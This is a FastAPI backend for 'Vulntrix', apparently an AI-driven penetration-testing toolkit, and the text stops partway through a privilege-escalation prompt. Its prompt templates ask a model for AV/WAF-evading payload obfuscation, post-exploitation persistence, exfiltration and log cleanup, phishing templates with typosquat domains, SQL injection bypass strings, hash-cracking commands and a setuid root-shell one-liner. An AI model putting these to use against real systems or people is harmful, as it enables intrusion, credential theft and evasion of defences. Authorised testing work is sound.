#!/usr/bin/env python3
"""
web_server.py — FastAPI backend for Vulntrix
Ultimate build: all endpoints for every feature.

Run with:
  python web_server.py
  Open: http://localhost:8000
"""
from fastapi import Request
import os
import asyncio
import json
import re
import sys
import tempfile
import uuid as _uuid
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from pathlib import Path
from typing import Optional

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, UploadFile, File, HTTPException, Query
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from starlette.middleware.base import BaseHTTPMiddleware
from pydantic import BaseModel

from ai_core import ModelRouter
from ai_core.model_router import ModelConfig
from ai_core.ollama_client import OllamaClient, OllamaError
from context import TargetContext, SessionStore
from parsers import FileLoader
from prompts import ReconPrompts, SystemPrompts
from logger import get_logger
import auth
from auth import (
    verify_token, verify_secret,
    create_session, refresh_session, revoke_session,
)
# Ensure every later "import auth" points at this same module object.
sys.modules["auth"] = auth
from rate_limit import RateLimitMiddleware, ws_allowed
from security_headers import SecurityHeadersMiddleware

log = get_logger("web_server")


# ─── Body-size guard ────────────────────────────────────────────────────────

import logging as _logging

_MAX_BODY = int(os.environ.get("MAX_BODY_MB", "4")) * 1_048_576  # default 4 MB

async def _body_size_middleware(request: Request, call_next):
    cl = request.headers.get("content-length")
    if cl and int(cl) > _MAX_BODY:
        return JSONResponse(
            status_code=413,
            content={"error": f"Request body too large (max {_MAX_BODY // 1_048_576} MB)"},
        )
    return await call_next(request)


# ── Strip ?token= from uvicorn access logs ───────────────────────────────────

class _TokenStripFilter(_logging.Filter):
    """Remove session tokens from access-log lines to avoid credential leakage."""
    import re as _re
    _PAT = _re.compile(r"(\?|&)token=[^&\s\"']+")

    def filter(self, record: _logging.LogRecord) -> bool:
        if isinstance(record.args, tuple):
            record.args = tuple(
                self._PAT.sub(r"\1token=***", a) if isinstance(a, str) else a
                for a in record.args
            )
        return True

for _uvlogger in ("uvicorn.access", "uvicorn"):
    _logging.getLogger(_uvlogger).addFilter(_TokenStripFilter())


# ─── App setup ──────────────────────────────────────────────────────────────

APP_VERSION = "3.0.0"
app = FastAPI(title="Vulntrix", version=APP_VERSION)

# Middleware is applied in LIFO order — SecurityHeaders runs outermost,
# then body-size, then RateLimit, then Auth.
async def _runtime_auth_middleware(request: Request, call_next):
    # Keep a single auth module object shared across imports/tests.
    sys.modules["auth"] = auth
    if not auth.AUTH_ENABLED:
        return await call_next(request)

    path = request.url.path
    if path in auth._ALWAYS_PUBLIC or any(path.startswith(p) for p in auth._PUBLIC_PREFIXES):
        return await call_next(request)

    token = request.headers.get("X-Bot-Token", "") or request.query_params.get("token", "")
    if not auth.verify_token(token):
        return JSONResponse(status_code=401, content={"error": "Unauthorized"})

    return await call_next(request)

app.add_middleware(SecurityHeadersMiddleware)
app.add_middleware(BaseHTTPMiddleware, dispatch=_body_size_middleware)
app.add_middleware(RateLimitMiddleware)
app.add_middleware(BaseHTTPMiddleware, dispatch=_runtime_auth_middleware)
# CORS origins — configurable via env so reverse-proxy deployments work.
# Set CORS_ORIGINS="https://your.domain,https://another.origin" to customise.
_DEFAULT_CORS = ",".join([
    "http://localhost:8000", "http://127.0.0.1:8000",
    "https://localhost:8443", "https://127.0.0.1:8443",
])
_CORS_ORIGINS = [
    o.strip()
    for o in os.environ.get("CORS_ORIGINS", _DEFAULT_CORS).split(",")
    if o.strip()
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=_CORS_ORIGINS,
    allow_methods=["GET", "POST", "DELETE", "OPTIONS"],
    allow_headers=["Content-Type", "X-Bot-Token"],
)

_executor = ThreadPoolExecutor(max_workers=6)

try:
    client = OllamaClient()
    router = ModelRouter(client=client, config=ModelConfig())
    if not client.health_check():
        raise OllamaError("Ollama not reachable at http://localhost:11434")
    log.info("Ollama connected — reasoning=%s  coding=%s",
             router.cfg.reasoning_model, router.cfg.coding_model)
except OllamaError as e:
    log.critical("Cannot reach Ollama: %s", e)
    log.critical("Start Ollama with:  ollama serve")
    sys.exit(1)

store = SessionStore()


# ─── Auth endpoints ───────────────────────────────────────────────────────────

class AuthRequest(BaseModel):
    token: str

@app.post("/api/auth/verify")
async def auth_verify(req: AuthRequest, request: Request):
    """Exchange BOT_SECRET for a time-limited session token."""
    if not auth.AUTH_ENABLED:
        return {"valid": True, "session_token": "", "expires_in": None}
    ip = request.client.host if request.client else ""
    if verify_secret(req.token):
        session_token = create_session(ip)
        return {
            "valid":         True,
            "session_token": session_token,
            "expires_in":    auth.SESSION_TTL,
        }
    log.warning("Failed login attempt from %s", ip)
    return {"valid": False, "session_token": "", "expires_in": None}

@app.post("/api/auth/refresh")
async def auth_refresh(request: Request):
    """Extend the current session's TTL."""
    token = request.headers.get("X-Bot-Token", "") or request.query_params.get("token", "")
    if not auth.AUTH_ENABLED:
        return {"refreshed": True, "expires_in": None}
    if refresh_session(token):
        return {"refreshed": True, "expires_in": auth.SESSION_TTL}
    return JSONResponse(status_code=401, content={"error": "Session expired or not found"})

@app.post("/api/auth/logout")
async def auth_logout(request: Request):
    """Revoke the current session immediately."""
    token = request.headers.get("X-Bot-Token", "") or request.query_params.get("token", "")
    revoke_session(token)
    return {"logged_out": True}

@app.get("/api/auth/status")
async def auth_status():
    return {"auth_enabled": auth.AUTH_ENABLED, "session_ttl_hours": auth.SESSION_TTL // 3600}


# ─── Pydantic request models ─────────────────────────────────────────────────

class TargetRequest(BaseModel):
    target: str

    @classmethod
    def __get_validators__(cls):
        yield cls.validate_target

    @staticmethod
    def validate_target(v):
        return v

    model_config = {"str_strip_whitespace": True}

    def model_post_init(self, __context) -> None:
        if not self.target:
            raise ValueError("target must not be empty")
        if len(self.target) > 253:
            raise ValueError("target name too long (max 253 chars)")
        # Reject path-traversal characters
        bad = set(self.target) & set('/\\:*?"<>|\x00')
        if bad:
            raise ValueError(f"target contains invalid characters: {bad}")

class NoteRequest(BaseModel):
    label: str
    content: str

class CredentialRequest(BaseModel):
    target:   str
    username: str
    password: str = ""
    hash_val: str = ""
    service:  str = ""

class AttackStageRequest(BaseModel):
    stage:  str
    status: str = "pending"
    notes:  str = ""

class ExploitRequest(BaseModel):
    vuln_type: str
    lhost:     str = "10.10.14.1"
    lport:     int = 4444
    language:  str = "python"
    details:   Optional[str] = None

class ChatRequest(BaseModel):
    message: str
    mode:    str = "analyse"

class PasteReconRequest(BaseModel):
    text:      str
    tool_hint: str = "auto"
    target:    str = ""

class CveLookupRequest(BaseModel):
    query:  str
    target: Optional[str] = None

class MsfSearchRequest(BaseModel):
    query:  str
    target: Optional[str] = None

class ReportRequest(BaseModel):
    target:   str
    title:    str = "Penetration Test Report"
    author:   str = ""
    date:     str = ""
    severity: str = "High"
    summary:  str = ""

class HashCrackRequest(BaseModel):
    hash_value: str
    hash_type:  str = "auto"
    context:    Optional[str] = None

class ObfuscateRequest(BaseModel):
    payload:     str
    technique:   str = "all"   # base64 / xor / char / powershell / all
    language:    str = "auto"
    target_info: Optional[str] = None

class PostExRequest(BaseModel):
    os_type:      str        = "linux"    # linux / windows
    access_level: str        = "user"     # user / admin / root / system
    goals:        list[str]  = ["enum"]   # enum / persist / creds / pivot / exfil / cleanup
    context:      Optional[str] = None

class WordlistRequest(BaseModel):
    company:  str = ""
    names:    str = ""
    domain:   str = ""
    keywords: str = ""
    style:    str = "passwords"   # passwords / directories / subdomains / usernames

class WafEvasionRequest(BaseModel):
    waf_type:    str = "generic"    # cloudflare / modsecurity / aws / f5 / generic
    attack_type: str = "generic"    # sqli / xss / lfi / rce / generic
    payload:     str = ""
    target:      Optional[str] = None

class PhishingRequest(BaseModel):
    company:  str
    role:     str = "employee"
    pretext:  str = "IT support"
    goal:     str = "credential harvest"   # credential harvest / malware delivery / recon

class PrivescRequest(BaseModel):
    os_type:      str = "linux"
    current_user: str = "www-data"
    context:      Optional[str] = None

class TimelineEventRequest(BaseModel):
    target:   str
    event:    str = ""
    content:  str = ""
    category: str = "recon"   # recon / exploit / privesc / lateral / exfil / misc
    severity: str = "info"    # info / success / warning / critical


# ─── Helper: blocking generate ───────────────────────────────────────────────

def _blocking_generate(prompt: str, system: Optional[str] = None, model: Optional[str] = None,
                        max_tokens: int = 4096) -> str:
    m = model or router.cfg.reasoning_model
    return client.generate(model=m, prompt=prompt, system=system, max_tokens=max_tokens)


# ─── Helper: safe 500 response (no stack trace to client) ────────────────────

def _err500(exc: Exception, public_msg: str = "Processing failed") -> JSONResponse:
    """
    Log the full exception server-side, return a generic error to the client.
    Prevents leaking file paths, Ollama internals, or tracebacks in API responses.
    """
    log.exception("Internal error: %s", public_msg)
    return JSONResponse(
        status_code=500,
        content={"error": public_msg, "hint": "Check server logs for details"},
    )


# ─── Helper: parse JSON array from AI response ───────────────────────────────

def _extract_json_array(text: str) -> list:
    """
    Extract the first JSON array from *text*.
    Falls back to wrapping a bare JSON object in a list.
    Strips markdown code fences before parsing.
    """
    # Strip markdown code fences
    cleaned = re.sub(r"```(?:json)?\s*", "", text).strip()
    cleaned = cleaned.replace("```", "")
    # Try a top-level array first
    match = re.search(r'\[.*\]', cleaned, re.DOTALL)
    if match:
        try:
            result = json.loads(match.group())
            if isinstance(result, list):
                return result
        except Exception:
            pass
    # Fall back to a bare object — wrap it
    match = re.search(r'\{.*\}', cleaned, re.DOTALL)
    if match:
        try:
            obj = json.loads(match.group())
            if isinstance(obj, dict):
                return [obj]
        except Exception:
            pass
    return []


# ─── Helper: async wrapper for sync streaming generators ─────────────────────

async def stream_tokens_to_ws(websocket: WebSocket, sync_gen):
    loop  = asyncio.get_running_loop()
    queue: asyncio.Queue = asyncio.Queue()
    _DONE = object()

    def producer():
        try:
            for token in sync_gen:
                loop.call_soon_threadsafe(queue.put_nowait, token)
        except Exception as exc:
            loop.call_soon_threadsafe(queue.put_nowait, {"__error__": str(exc)})
        finally:
            loop.call_soon_threadsafe(queue.put_nowait, _DONE)

    loop.run_in_executor(_executor, producer)

    while True:
        item = await queue.get()
        if item is _DONE:
            break
        if isinstance(item, dict) and "__error__" in item:
            await websocket.send_json({"error": item["__error__"]})
            break
        await websocket.send_json({"token": item, "done": False})

    await websocket.send_json({"done": True})


# ─── REST API ────────────────────────────────────────────────────────────────

@app.get("/api/version")
async def version():
    return {"version": APP_VERSION, "name": "Vulntrix"}


@app.get("/api/health")
async def health():
    try:
        is_up     = client.health_check()
        available = set(client.list_models()) if is_up else set()

        def model_ok(name: str) -> bool:
            return any(m == name or m.startswith(name + ":") for m in available)

        reasoning = router.cfg.reasoning_model
        coding    = router.cfg.coding_model
        return {
            "ollama":          "ok" if is_up else "error",
            "reasoning_model": reasoning,
            "coding_model":    coding,
            "reasoning_ok":    model_ok(reasoning),
            "coding_ok":       model_ok(coding),
            "all_models":      sorted(available),
        }
    except Exception as e:
        return JSONResponse(status_code=503, content={"status": "error", "detail": str(e)})


@app.get("/api/models")
async def list_all_models():
    try:
        return {"models": sorted(client.list_models())}
    except Exception as e:
        return JSONResponse(status_code=503, content={"error": str(e)})


# ── Target management ────────────────────────────────────────────────────────

@app.post("/api/target")
async def set_target(req: TargetRequest):
    ctx = TargetContext(req.target)
    if not ctx.exists():
        # Ensure a newly selected target immediately has persisted context.
        ctx.save()
    store.set_current(req.target)
    return {
        "target":  req.target,
        "is_new":  not ctx.exists(),
        "context": ctx.context_summary(),
    }


@app.get("/api/targets")
async def list_targets():
    return store.list_targets()


@app.delete("/api/target/{target}")
async def delete_target(target: str):
    ctx = TargetContext(target)
    deleted = ctx.delete()
    if store.get_current() == target:
        store.set_current("")
    return {"deleted": deleted, "target": target}


@app.post("/api/reset-data")
async def reset_all_data():
    """Dangerous operation: wipe all saved local target context files."""
    result = store.wipe_all()
    return {"ok": True, **result}


@app.get("/api/target/{target}/context")
async def get_context(target: str):
    ctx = TargetContext(target)
    if not ctx.exists():
        raise HTTPException(status_code=404, detail="Target not found")
    return {
        "target": target,
        "metadata": {
            "ip":         ctx._data.ip,
            "hostname":   ctx._data.hostname,
            "os_guess":   ctx._data.os_guess,
            "open_ports": ctx._data.open_ports,
        },
        "notes":        ctx.list_notes(),
        "credentials":  ctx.list_credentials(),
        "attack_chain": ctx.get_attack_chain(),
        "summary":      ctx.context_summary(),
    }


# ── Notes ────────────────────────────────────────────────────────────────────

@app.post("/api/note")
async def add_note(req: NoteRequest):
    current = store.get_current()
    if not current:
        raise HTTPException(status_code=400, detail="No active target set")
    ctx = TargetContext(current)
    ctx.add_note(req.label, req.content)
    ctx.save()
    return {"message": f"Note '{req.label}' saved", "ok": True}


@app.delete("/api/note/{label}")
async def delete_note(label: str):
    current = store.get_current()
    if not current:
        raise HTTPException(status_code=400, detail="No active target set")
    ctx = TargetContext(current)
    deleted = ctx.delete_note(label)
    ctx.save()
    return {"deleted": deleted}


# ── Credentials ──────────────────────────────────────────────────────────────

@app.post("/api/credential")
async def add_credential(req: CredentialRequest):
    ctx = TargetContext(req.target)
    secret = req.password or req.hash_val
    ctx.add_credential(req.username, secret, service=req.service)
    ctx.save()
    return {"message": f"Credential saved: {req.username}", "ok": True}


# ── Attack chain ─────────────────────────────────────────────────────────────

@app.post("/api/attack-stage")
async def add_attack_stage(req: AttackStageRequest):
    current = store.get_current()
    if not current:
        raise HTTPException(status_code=400, detail="No active target set")
    ctx = TargetContext(current)
    if req.status == "pending":
        ctx.add_attack_stage(req.stage)
    else:
        ctx.update_attack_stage(req.stage, req.status, req.notes)
    ctx.save()
    return {"message": f"Stage '{req.stage}' -> {req.status}", "ok": True}


# ── Timeline ─────────────────────────────────────────────────────────────────

@app.get("/api/timeline/{target}")
async def get_timeline(target: str):
    ctx = TargetContext(target)
    return ctx.get_log(limit=200)


@app.post("/api/timeline/event")
async def add_timeline_event(req: TimelineEventRequest):
    ctx = TargetContext(req.target)
    content = (req.event or req.content).strip()
    if not content:
        raise HTTPException(status_code=422, detail="event/content is required")
    ctx.log_event(req.category, f"[{req.severity.upper()}] {content}")
    ctx.save()
    return {"ok": True, "event": content}


# ── Recon analysis ───────────────────────────────────────────────────────────

@app.post("/api/recon/file")
async def upload_scan(file: UploadFile = File(...)):
    current = store.get_current()
    if not current:
        raise HTTPException(status_code=400, detail="No active target set")

    # Sanitise filename — strip path components to prevent directory traversal.
    # Include a UUID to prevent collision/overwrite races in shared temp dirs.
    safe_name = re.sub(r"[^\w.\-]", "_", Path(file.filename or "upload").name)[:80]
    tmp_file  = Path(tempfile.gettempdir()) / f"vulntrix_{_uuid.uuid4().hex}_{safe_name}"
    content   = await file.read()
    # Belt-and-braces size check (covers clients that omit Content-Length)
    if len(content) > _MAX_BODY:
        raise HTTPException(status_code=413, detail="File too large")
    tmp_file.write_bytes(content)

    try:
        loop = asyncio.get_running_loop()
        tool_type, result = await loop.run_in_executor(
            _executor, lambda: FileLoader.load(tmp_file)
        )
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Parse error: {e}")
    finally:
        try: tmp_file.unlink()
        except Exception: pass

    ctx   = TargetContext(current)
    extra = ctx.get_all_analysis() or None

    if tool_type == "nmap":
        from parsers.nmap_parser import NmapResult
        if isinstance(result, NmapResult):
            nmap_res = result
            if nmap_res.target and nmap_res.has_reliable_data:
                ctx.set_metadata(
                    ip         = nmap_res.target,
                    hostname   = nmap_res.hostname,
                    os_guess   = nmap_res.os_guess,
                    open_ports = [p.port for p in nmap_res.open_ports],
                )
                ctx.save()
            prompt = ReconPrompts.nmap_analysis(
                scan_output   = nmap_res.clean_text,
                target        = nmap_res.target or current,
                extra_context = extra,
                nmap_result   = nmap_res,
            )
            return {
                "tool_type":    "nmap",
                "target":       nmap_res.target or current,
                "scan_quality": nmap_res.scan_quality.value,
                "open_ports":   len(nmap_res.open_ports),
                "noise_lines":  nmap_res.metrics.noise_lines,
                "reliable":     nmap_res.has_reliable_data,
                "prompt":       prompt,
                "can_stream":   True,
            }
        else:
            prompt = ReconPrompts.nmap_analysis(result.raw_text, current, extra)
    elif tool_type == "gobuster":
        prompt = ReconPrompts.web_directory_analysis(result.raw_text, current, None, extra)
    elif tool_type == "linpeas":
        from parsers.linpeas_parser import LinpeasResult
        txt    = result.top_sections_text() if isinstance(result, LinpeasResult) else result.raw_text
        prompt = ReconPrompts.privesc_analysis(txt, current, None, extra)
    else:
        prompt = ReconPrompts.generic_recon_analysis(tool_type, result.raw_text[:6000], current, extra)

    return {
        "tool_type":  tool_type,
        "target":     current,
        "reliable":   True,
        "prompt":     prompt,
        "can_stream": True,
    }


@app.post("/api/recon/paste")
async def paste_recon(req: PasteReconRequest):
    current = req.target or store.get_current()
    if not current:
        raise HTTPException(status_code=400, detail="No active target set")

    text      = req.text[:20000]
    tool_hint = req.tool_hint.lower()

    if tool_hint == "auto":
        if "# Nmap" in text or "/tcp" in text or "open port" in text.lower():
            tool_hint = "nmap"
        elif "Status: 200" in text or "/.git" in text or "gobuster" in text.lower():
            tool_hint = "gobuster"
        elif "PEASS" in text or "linpeas" in text.lower() or "SUID" in text:
            tool_hint = "linpeas"
        else:
            tool_hint = "generic"

    ctx   = TargetContext(current)
    extra = ctx.get_all_analysis() or None

    if tool_hint == "nmap":
        from parsers.nmap_parser import NmapParser
        nmap_res = NmapParser.from_string(text)
        if nmap_res.target and nmap_res.has_reliable_data:
            ctx.set_metadata(
                ip         = nmap_res.target,
                hostname   = nmap_res.hostname,
                os_guess   = nmap_res.os_guess,
                open_ports = [p.port for p in nmap_res.open_ports],
            )
            ctx.save()
        prompt = ReconPrompts.nmap_analysis(
            scan_output   = nmap_res.clean_text,
            target        = nmap_res.target or current,
            extra_context = extra,
            nmap_result   = nmap_res,
        )
        return {
            "tool_type":    "nmap",
            "target":       nmap_res.target or current,
            "scan_quality": nmap_res.scan_quality.value,
            "open_ports":   len(nmap_res.open_ports),
            "noise_lines":  nmap_res.metrics.noise_lines,
            "reliable":     nmap_res.has_reliable_data,
            "prompt":       prompt,
        }
    elif tool_hint == "gobuster":
        prompt = ReconPrompts.web_directory_analysis(text, current, None, extra)
    elif tool_hint == "linpeas":
        prompt = ReconPrompts.privesc_analysis(text, current, None, extra)
    else:
        prompt = ReconPrompts.generic_recon_analysis(tool_hint, text, current, extra)

    return {"tool_type": tool_hint, "target": current, "prompt": prompt}


# ── CVE Lookup ───────────────────────────────────────────────────────────────

@app.post("/api/cve/lookup")
async def cve_lookup(req: CveLookupRequest):
    prompt = f"""You are a CVE database expert. For the query below, list the most relevant known CVEs.

Query: {req.query}
{f'Target context: {req.target}' if req.target else ''}

Return ONLY a JSON array (no other text):
[
  {{
    "id": "CVE-YYYY-XXXXX",
    "title": "Brief title",
    "severity": "critical|high|medium|low",
    "cvss": "9.8",
    "description": "What the vulnerability is",
    "exploit": "How to exploit it / PoC location / tool",
    "patch": "How to fix / patch version"
  }}
]

List up to 6 CVEs. Focus on exploitable, real-world issues. If a CVE ID is given directly, give full details on it."""

    loop = asyncio.get_running_loop()
    try:
        raw     = await loop.run_in_executor(_executor, lambda: _blocking_generate(prompt))
        results = _extract_json_array(raw)
        if not results:
            results = [{"id": "AI", "title": req.query, "severity": "medium",
                        "description": raw, "exploit": "", "patch": ""}]
        return {"results": results, "query": req.query}
    except Exception as e:
        return _err500(e, "Lookup failed")


# ── Metasploit Modules ───────────────────────────────────────────────────────

@app.post("/api/msf/search")
async def msf_search(req: MsfSearchRequest):
    prompt = f"""You are a Metasploit Framework expert. Recommend the best Metasploit modules for:

Query: {req.query}
{f'Target: {req.target}' if req.target else ''}

Return ONLY a JSON array (no other text):
[
  {{
    "path": "exploit/windows/smb/ms17_010_eternalblue",
    "name": "MS17-010 EternalBlue SMB RCE",
    "type": "exploit|auxiliary|post",
    "description": "What it does and when to use it",
    "command": "use exploit/windows/smb/ms17_010_eternalblue\\nset RHOSTS <target>\\nset LHOST <your-ip>\\nset LPORT 4444\\nrun"
  }}
]

List up to 5 modules with exact paths and ready-to-use commands."""

    loop = asyncio.get_running_loop()
    try:
        raw     = await loop.run_in_executor(_executor, lambda: _blocking_generate(prompt))
        modules = _extract_json_array(raw)
        if not modules:
            modules = [{"path": "AI", "name": req.query, "description": raw, "command": ""}]
        return {"modules": modules, "query": req.query}
    except Exception as e:
        return _err500(e, "Module search failed")


# ── Hash Cracker ─────────────────────────────────────────────────────────────

@app.post("/api/hash/analyze")
async def hash_analyze(req: HashCrackRequest):
    prompt = f"""You are a password hash analysis expert. Analyze this hash and provide cracking guidance.

Hash: {req.hash_value}
Type hint: {req.hash_type}
{f'Context: {req.context}' if req.context else ''}

Return ONLY a JSON object (no other text):
{{
  "hash_type": "NTLM|MD5|SHA1|SHA256|bcrypt|SHA512crypt|etc",
  "confidence": "high|medium|low",
  "length": {len(req.hash_value)},
  "hashcat_mode": "1000",
  "john_format": "nt",
  "hashcat_command": "hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule",
  "john_command": "john --format=nt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt",
  "online_resources": ["https://crackstation.net", "https://hashes.com/en/decrypt/hash"],
  "rainbow_table": true,
  "cracking_tips": [
    "Start with rockyou.txt",
    "Apply best64 rules",
    "Try hashcat mask attacks for patterns"
  ],
  "estimated_crack_time": "Minutes on GPU with common wordlist",
  "is_salted": false,
  "notes": "Any additional analysis"
}}"""

    loop = asyncio.get_running_loop()
    try:
        raw = await loop.run_in_executor(_executor, lambda: _blocking_generate(prompt))
        match = re.search(r'\{.*\}', raw, re.DOTALL)
        if match:
            result = json.loads(match.group())
        else:
            result = {"hash_type": "unknown", "notes": raw, "hashcat_command": "", "john_command": ""}
        return {"result": result, "hash": req.hash_value}
    except Exception as e:
        return _err500(e)


# ── Payload Obfuscator ───────────────────────────────────────────────────────

@app.post("/api/payload/obfuscate")
async def obfuscate_payload(req: ObfuscateRequest):
    prompt = f"""You are an advanced payload obfuscation expert. Obfuscate the following payload to bypass AV/IDS/WAF detection.

Original Payload:
```
{req.payload[:3000]}
```

Language/Type: {req.language}
Techniques requested: {req.technique}
{f'Target context: {req.target_info}' if req.target_info else ''}

Return ONLY a JSON object (no other text):
{{
  "techniques_applied": ["base64", "xor", "char_substitution"],
  "variants": [
    {{
      "name": "Base64 encoded",
      "technique": "base64",
      "payload": "<obfuscated payload here>",
      "decoder_stub": "<code to decode and execute>",
      "one_liner": "<single command to paste>",
      "bypasses": "Basic signature matching, simple AV",
      "notes": "Combine with execution method"
    }}
  ],
  "evasion_tips": [
    "Use HTTPS for C2 to blend with traffic",
    "Add sleep timers to avoid sandbox detection"
  ]
}}

Apply multiple obfuscation techniques and provide a variant for each."""

    loop = asyncio.get_running_loop()
    try:
        raw = await loop.run_in_executor(_executor, lambda: _blocking_generate(prompt, max_tokens=6000))
        match = re.search(r'\{.*\}', raw, re.DOTALL)
        if match:
            result = json.loads(match.group())
        else:
            result = {"techniques_applied": [], "variants": [{"name": "AI output", "payload": raw}], "evasion_tips": []}
        return {"result": result}
    except Exception as e:
        return _err500(e)


# ── Post-Exploitation Builder ─────────────────────────────────────────────────

@app.post("/api/postex/build")
async def postex_build(req: PostExRequest):
    goals_str = ", ".join(req.goals)
    prompt = f"""You are a post-exploitation expert. Generate a comprehensive post-exploitation command set.

Operating System: {req.os_type}
Current Access Level: {req.access_level}
Goals: {goals_str}
{f'Context: {req.context}' if req.context else ''}

Return ONLY a JSON object (no other text):
{{
  "os": "{req.os_type}",
  "access": "{req.access_level}",
  "sections": [
    {{
      "goal": "Enumeration",
      "commands": [
        {{
          "description": "Get current user and groups",
          "command": "id && whoami && groups",
          "output_to_look_for": "root, sudo, docker, lxd",
          "why": "Identifies privilege level and group memberships"
        }}
      ]
    }}
  ],
  "one_shot_scripts": [
    {{
      "name": "Full enum one-liner",
      "command": "id;uname -a;cat /etc/passwd;ss -tlnp",
      "description": "Quick situational awareness"
    }}
  ],
  "persistence_methods": ["cron job", "SSH key", ".bashrc"],
  "cleanup_commands": ["history -c", "rm -f /tmp/payloads*"]
}}"""

    loop = asyncio.get_running_loop()
    try:
        raw = await loop.run_in_executor(_executor, lambda: _blocking_generate(prompt, max_tokens=6000))
        match = re.search(r'\{.*\}', raw, re.DOTALL)
        if match:
            result = json.loads(match.group())
        else:
            result = {"os": req.os_type, "sections": [{"goal": "AI Output", "commands": [{"command": raw}]}]}
        return {"result": result}
    except Exception as e:
        return _err500(e)


# ── Wordlist Generator ────────────────────────────────────────────────────────

@app.post("/api/wordlist/generate")
async def wordlist_generate(req: WordlistRequest):
    prompt = f"""You are a password and wordlist generation expert. Generate a targeted wordlist.

Target Information:
- Company/Organization: {req.company or 'unknown'}
- Known names/employees: {req.names or 'unknown'}
- Domain: {req.domain or 'unknown'}
- Additional keywords: {req.keywords or 'none'}
- Wordlist style: {req.style}

Return ONLY a JSON object (no other text):
{{
  "style": "{req.style}",
  "count": 50,
  "words": [
    "Password1",
    "Company2024!",
    "Welcome123"
  ],
  "patterns_used": [
    "CompanyName + year",
    "name + common suffix",
    "Season + year + special char"
  ],
  "hashcat_masks": [
    "?u?l?l?l?l?d?d?d?s",
    "Company?d?d?d?d"
  ],
  "recommended_rules": ["best64", "OneRuleToRuleThemAll"],
  "spray_order": "Start with Password1, Welcome1, then company-specific",
  "notes": "Test with 1 password per account to avoid lockout"
}}

Generate 50+ targeted words. For passwords: include common patterns, company name variations, seasons/years.
For directories: include common web paths, admin panels, APIs.
For subdomains: include common subdomain names."""

    loop = asyncio.get_running_loop()
    try:
        raw = await loop.run_in_executor(_executor, lambda: _blocking_generate(prompt, max_tokens=4096))
        match = re.search(r'\{.*\}', raw, re.DOTALL)
        if match:
            result = json.loads(match.group())
        else:
            result = {"style": req.style, "words": raw.split('\n')[:100], "count": 0}
        return {"result": result}
    except Exception as e:
        return _err500(e)


# ── WAF / IDS Evasion ─────────────────────────────────────────────────────────

@app.post("/api/waf/evade")
async def waf_evade(req: WafEvasionRequest):
    prompt = f"""You are a WAF/IDS evasion specialist. Provide bypass techniques for:

WAF Type: {req.waf_type}
Attack Type: {req.attack_type}
{f'Original payload to bypass with: {req.payload}' if req.payload else ''}
{f'Target: {req.target}' if req.target else ''}

Return ONLY a JSON object (no other text):
{{
  "waf": "{req.waf_type}",
  "attack_type": "{req.attack_type}",
  "techniques": [
    {{
      "name": "Case variation",
      "description": "Mix upper/lowercase to bypass signature matching",
      "example": "SeLeCt * FrOm users",
      "effectiveness": "low|medium|high",
      "notes": "Works on case-sensitive rules"
    }}
  ],
  "encoded_payloads": [
    {{
      "encoding": "URL double encode",
      "original": "' OR 1=1--",
      "encoded": "%2527%2520OR%25201%253D1--",
      "context": "Use in GET parameters"
    }}
  ],
  "bypass_tips": [
    "Add HTTP header X-Forwarded-For: 127.0.0.1",
    "Use chunked transfer encoding"
  ],
  "detection_avoidance": [
    "Slow down requests (rate limit)",
    "Randomize User-Agent"
  ],
  "tool_commands": [
    "sqlmap --tamper=space2comment,between,randomcase -u <url>"
  ]
}}"""

    loop = asyncio.get_running_loop()
    try:
        raw = await loop.run_in_executor(_executor, lambda: _blocking_generate(prompt, max_tokens=4096))
        match = re.search(r'\{.*\}', raw, re.DOTALL)
        if match:
            result = json.loads(match.group())
        else:
            result = {"waf": req.waf_type, "techniques": [{"name": "AI Output", "description": raw}]}
        return {"result": result}
    except Exception as e:
        return _err500(e)


# ── Phishing Template Generator ───────────────────────────────────────────────

@app.post("/api/phishing/generate")
async def phishing_generate(req: PhishingRequest):
    prompt = f"""You are a social engineering and phishing simulation expert. Create phishing templates.

Target Company: {req.company}
Target Role: {req.role}
Pretext/Scenario: {req.pretext}
Goal: {req.goal}

Return ONLY a JSON object (no other text):
{{
  "scenario": "{req.pretext}",
  "goal": "{req.goal}",
  "templates": [
    {{
      "name": "IT Password Reset",
      "type": "email",
      "subject": "URGENT: Your password expires in 24 hours",
      "sender_name": "IT Support",
      "sender_email": "it-support@{req.company.lower().replace(' ','-')}.com",
      "body": "<full email body here with {{victim_name}} and {{company}} placeholders>",
      "call_to_action": "Click here to reset password",
      "landing_page_hint": "Fake login page mirroring company portal",
      "effectiveness": "high",
      "indicators_of_compromise": "urgency, spoofed domain, suspicious link"
    }}
  ],
  "pretexting_scripts": [
    {{
      "channel": "phone",
      "script": "Hello, this is IT support calling about your account..."
    }}
  ],
  "infrastructure_setup": [
    "Register typosquat domain: {req.company.lower().replace(' ','')}corp.com",
    "Clone login portal with HTTrack",
    "Set up GoPhish for tracking"
  ],
  "opsec_tips": [
    "Use VPN when testing",
    "Get written authorization first"
  ],
  "legal_reminder": "ALWAYS get written authorization before conducting phishing simulations"
}}"""

    loop = asyncio.get_running_loop()
    try:
        raw = await loop.run_in_executor(_executor, lambda: _blocking_generate(prompt, max_tokens=6000))
        match = re.search(r'\{.*\}', raw, re.DOTALL)
        if match:
            result = json.loads(match.group())
        else:
            result = {"scenario": req.pretext, "templates": [{"name": "AI Output", "body": raw}]}
        return {"result": result}
    except Exception as e:
        return _err500(e)


# ── PrivEsc Checklist ─────────────────────────────────────────────────────────

@app.post("/api/privesc/checklist")
async def privesc_checklist(req: PrivescRequest):
    prompt = f"""You are a privilege escalation expert. Generate a comprehensive interactive checklist.

Operating System: {req.os_type}
Current User: {req.current_user}
{f'Context from recon: {req.context}' if req.context else ''}

Return ONLY a JSON object (no other text):
{{
  "os": "{req.os_type}",
  "user": "{req.current_user}",
  "categories": [
    {{
      "name": "SUID/SGID Binaries",
      "priority": "critical",
      "checks": [
        {{
          "id": "suid-001",
          "title": "Find SUID binaries",
          "command": "find / -perm -4000 -type f 2>/dev/null",
          "what_to_look_for": "Non-standard SUID binaries: vim, python, nmap, find, bash, cp",
          "exploit_if_found": "GTFOBins: python -c 'import os; os.setuid(0); os.system(\\"/bin/bash\\")'",
          "reference": "https://gtfobins.github.io/",
